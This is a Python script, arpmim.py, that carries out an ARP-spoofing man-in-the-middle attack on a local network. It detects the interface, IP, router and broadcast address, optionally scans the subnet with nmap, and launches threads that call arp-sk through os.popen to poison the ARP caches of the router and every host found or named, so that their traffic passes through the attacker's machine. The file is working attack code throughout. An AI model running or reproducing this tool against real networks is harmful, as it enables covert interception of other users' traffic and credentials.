#!/usr/bin/env python
# -*- coding: utf-8 -*-

""" arpmim.py -- ARP man in the middle script """

from utils import *

import subprocess as sp
import os as os
import binascii
from numpy import delete
import random
import sys
from threading import Thread
import time
import re

    
class arpAttack(Thread):


    def __init__(self, IPsource, IPdest):
        Thread.__init__(self)
        self.IPsource = IPsource
        self.IPdest = IPdest

    def run(self):
        os.popen("arp-sk -i " + interface + " -s " + myIP + " -d " + self.IPdest + " -S " + self.IPsource + " -D " + self.IPdest + " -T u10000")
        print("arp-sk -i " + interface + " -s " + myIP + " -d " + self.IPdest + " -S " + self.IPsource + " -D " + self.IPdest + " -T u10000")
        
    def toString(self):
        return self.IPdest + "->" + myIP + "->" + self.IPsource
    
def tresser(adresses):
    adresses = purify(adresses)
    threads = []
    threads.append(arpAttack(router, broadcast))
    for i in adresses:
        threads.append(arpAttack(i, router))
    return threads


def purify(adresses):
    i, index = 0, []
    while i < len(adresses):
        adresses[i] = format_output(adresses[i])
        if adresses[i] == first_addr or adresses[i] == broadcast or adresses[i] == router or adresses[i] == myIP or adresses[i] == "":
            index.append(i)
        i += 1 
    return delete(adresses, index)  


### Get net info


interface = multitool("interface")
netmask = int(multitool("netmask").replace("0x",""), 16)
myIP = multitool("IP")
router = multitool("router")
CIDR = CIDR_find(netmask)
first_addr = inttoIP(formatIP(myIP) & netmask)
broadcast = inttoIP((formatIP(myIP) | (~ netmask)) & 0xFFFFFFFF)

print("Interface : " + str(interface) + "\n" + "Adresse IP : " + str(myIP) + "/" + str(CIDR) + "\n" + "Routeur : " + str(router) + "\n" + "First Address : " + str(first_addr) + "\n" + "Broadcast : " + str(broadcast))


### Command line parsing

        
if len(sys.argv) == 4 and sys.argv[1] == "-c" and areIP(sys.argv[2:]):
    threads = [arpAttack(sys.argv[2], sys.argv[3]),arpAttack(sys.argv[3], sys.argv[2])]
elif len(sys.argv) == 2 and sys.argv[1] == "-i":
    sys.exit("Aucune commande lancée")
elif len(sys.argv) > 2 and areIP(sys.argv[1:]):
    ip_list = []
    for i in sys.argv[1:]:
        ip_list.append(i)
    threads = tresser(ip_list)
elif len(sys.argv) == 1:
    ip_list = os.popen("./multitool.sh nmap " + first_addr + "/" + str(CIDR)).read().split("\n")
    threads = tresser(ip_list)
else:
    sys.exit("Erreur d'argument")
   
for fil in threads:
    print(fil.toString())
    fil.start()
